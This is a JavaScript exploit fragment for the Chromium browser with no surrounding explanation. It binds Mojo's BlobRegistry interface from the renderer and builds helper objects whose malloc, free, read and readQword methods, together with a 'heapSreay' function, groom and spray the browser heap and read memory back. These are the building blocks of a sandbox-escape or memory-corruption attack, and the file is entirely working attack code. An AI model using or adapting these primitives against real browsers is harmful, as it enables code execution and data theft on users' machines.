function getAllocationConstructor() {
    let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
    Mojo.bindInterface(blink.mojom.BlobRegistry.name,
        mojo.makeRequest(blob_registry_ptr).handle, "process", true);

    function Allocation(size=280) {
        function ProgressClient(allocate) {
            function ProgressClientImpl() {
            }
            ProgressClientImpl.prototype = {
                onProgress: async (arg0) => {
                    if (this.allocate.writePromise) {
                        this.allocate.writePromise.resolve(arg0);
                    }
                }
            };
            this.allocate = allocate;

            this.ptr = new mojo.AssociatedInterfacePtrInfo();
            var progress_client_req = mojo.makeRequest(this.ptr);
            this.binding = new mojo.AssociatedBinding(
                blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
            );

            return this;
        }

        this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
        this.progressClient = new ProgressClient(this);
        blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
            this.serialized_blob = res.blob;
        })

        this.malloc = async function(data) {
            promise = new Promise((resolve, reject) => {
                this.writePromise = {resolve: resolve, reject: reject};
            });
            this.pipe.producer.writeData(data);
            this.pipe.producer.close();
            written = await promise;
            console.assert(written == data.byteLength);
        }

        this.free = async function() {
            this.serialized_blob.blob.ptr.reset();
            await sleep(20);
        }

        this.read = function(offset, length) {
            this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
            this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
            return new Promise((resolve) => {
                this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
                    result = new ArrayBuffer(length);
                    this.readpipe.consumer.readData(result);
                    this.watcher.cancel();
                    resolve(result);
                });
            });
        }

        this.readQword = async function(offset) {
            let res = await this.read(offset, 8);
            return (new DataView(res)).getBigUint64(0, true);
        }

        return this;
    }

    async function allocate(data) {
        let allocation = new Allocation(data.byteLength);
        await allocation.malloc(data);
        //await sleep(1000);
        return allocation;
    }
    return allocate;
}
async function heapSreay(allocator, data, size){
    return Promise.all(Array(size).fill().map(() => allocator(data)));
}
